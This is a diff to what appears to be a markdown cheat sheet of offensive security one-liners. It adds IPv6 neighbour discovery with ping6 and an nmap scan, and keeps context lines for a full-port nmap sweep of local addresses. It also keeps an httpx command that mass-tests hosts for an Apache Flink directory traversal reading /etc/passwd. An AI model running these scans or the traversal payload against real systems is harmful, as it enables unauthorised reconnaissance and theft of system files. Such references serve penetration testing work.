@@ -28,7 +28,24 @@ To output matches, add -o option to grep
 ifconfig -a | grep -Po '\b(?!255)(?:\d{1,3}\.){3}(?!255)\d{1,3}\b' | xargs nmap -A -p0-
 ```
 
-## Apache Flink Directory Traversal 
+## Nmap IPv6 Nodes:
+
+- All nodes multicast: ff02::1
+- All routers multicast: ff02::2
+
+Locate targets with builtin ```ping6``` command
+
+```
+$ ping6 ff02::1
+$ ping ff02::2
+
+# Look for neighbors
+$ ip neigh
+
+$ nmap -Pn -sV -6 fe80::20c0 -e eth0 --packet-trace
+```
+
+## Apache Flink Directory Traversal:
 
 ```
 cat hosts | httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd" -mr "root:x" -silent
